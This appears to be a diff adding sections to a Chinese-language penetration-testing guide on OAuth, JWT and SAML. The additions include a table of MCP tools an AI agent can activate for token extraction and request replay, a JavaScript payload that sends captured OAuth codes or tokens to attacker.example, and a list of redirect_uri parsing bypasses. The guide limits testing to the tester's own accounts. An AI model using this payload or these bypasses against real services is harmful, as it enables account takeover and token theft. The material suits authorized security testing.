@@ -275,6 +275,20 @@ SAML XSW                            = 9.8 Critical
 
 ---
 
+## 相关 MCP 工具
+
+实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。
+
+| 工具 | 域 | 调用时机 |
+|---|---|---|
+| `mcp__jshook__network_extract_auth` | network | 自动从抓包中提取 JWT / OAuth token / cookie |
+| `mcp__jshook__binary_encode` + `mcp__jshook__binary_decode` | encoding | JWT header / payload base64 改写,签名段单独处理 |
+| `mcp__jshook__network_replay_request` | network | 修改 redirect_uri / state / nonce 重放 |
+| `mcp__jshook__debugger_evaluate` | debugger | 在前端追 SAML 断言 / JWT 解析逻辑 |
+| `mcp__jshook__detect_crypto` + `mcp__jshook__crypto_extract_standalone` | core / transform | 提取签名函数离线复算 |
+
+完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)
+
 ## 8. 不要做的事
 
 - **禁**：用 redirect_uri 绕过实际抓真实用户的 code（即使是诱导朋友点击也不行）。用自己的两个账号自演。
@@ -2423,5 +2437,68 @@ http://[::1]
 http://[::]  (= 0.0.0.0)
 http://[::ffff:7f00:1]
 ```
+
+### OAuth 授权码劫持 — 在 redirect_uri 内执行的 JS payload
+
+OAuth 中 `redirect_uri` 若允许任意子路径(或 open redirect / XSS 落点),攻击者可在跳转后的页面执行 JS 把 `code` exfil 到自己服务器,完成无感劫持。受害者只看到正常的 OAuth 同意流程。
+
+```javascript
+// 在攻击者控制的 redirect_uri 页(或 redirect_uri 域上的 XSS sink)中执行
+var urlParams = new URLSearchParams(window.location.search);
+var capturedCode = urlParams.get('code');  // 也可换成 'access_token' / 'id_token'(fragment 模式)
+
+if (capturedCode) {
+    var http = new XMLHttpRequest();
+    // GET 模式带在 query;实战推荐 fetch + no-cors 或 navigator.sendBeacon 以规避 CSP report-only
+    http.open("GET", "https://attacker.example/log_code.php?code=" + encodeURIComponent(capturedCode), true);
+    http.send();
+}
+
+// implicit / hybrid flow(token 在 fragment):
+// var fragParams = new URLSearchParams(window.location.hash.slice(1));
+// var token = fragParams.get('access_token') || fragParams.get('id_token');
+```
+
+**何时用**:`redirect_uri` 校验允许 `https://target.com/anywhere` 子路径任意,且子路径有 XSS / 第三方 widget 注入面。证明影响时只对自己控制的两个账号操作,不要诱导真实用户点击。
+
+### OAuth / redirect_uri URL 解析差异 — 通用绕过库
+
+服务端常用 startsWith / parse_url / regex 比对 redirect_uri,但客户端浏览器解析按 [RFC 3986 + WHATWG URL](https://url.spec.whatwg.org/) 实际跳转,两者解析差异 → 跳转到攻击者域:
+
+```text
+# 用户态字符歧义(@、./、@host 形式)
+https://example.com?@www.attacker.com/
+https://example.com/@www.attacker.com/
+https://www.attacker.com@example.com/
+https://www.attacker.com.example.com/
+https://example.com?.www.attacker.com/
+https://example.com#.www.attacker.com/
+https://example.com/.www.attacker.com/
+
+# 双重 URL 嵌套
+https://example.com/https://www.attacker.com/
+https://example.com%2f@example.com/        # %2f 解码歧义
+https://example.com%2f@attacker.com/
+
+# 反斜杠 (`\`) — 部分库视为 path-sep,浏览器视为 host-sep
+https://example.com\@www.attacker.com/
+https://example.com\\@www.attacker.com/
+https://www.attacker.com\@example.com/
+
+# 字符集编码绕过(后端做 mb_convert_encoding / iconv 时,%ff / %df 可能消失或合并下一字节)
+https://example.com%ff@www.attacker.com/
+https://example.com%df@www.attacker.com/
+
+# 字符集解码后端样本(PHP):
+# $url = mb_convert_encoding($_GET['url'], "GBK", "UTF-8");
+# %df 在 GBK 下与下一字节合并,host 段被吞掉
+```
+
+**真实命中要点**:
+- 服务端用 `parse_url` / `urlparse` 取 host 后做白名单比对,但客户端按 WHATWG 实际跳转 → 解析差异
+- 服务端做编码转换(GBK / Big5 / Shift-JIS)前先比对 → 解码后 host 改变
+- 反斜杠在 Go / Node.js / Python 部分库视为 path 分隔符,浏览器视为 host 分隔符
+
+**报告价值**:从中危(open redirect)升到高危(账号接管)的关键是结合上面 §OAuth 授权码劫持 payload 证明可拿到他人 `code`。仍仅自演,不抓真实用户 code。
 
 ---
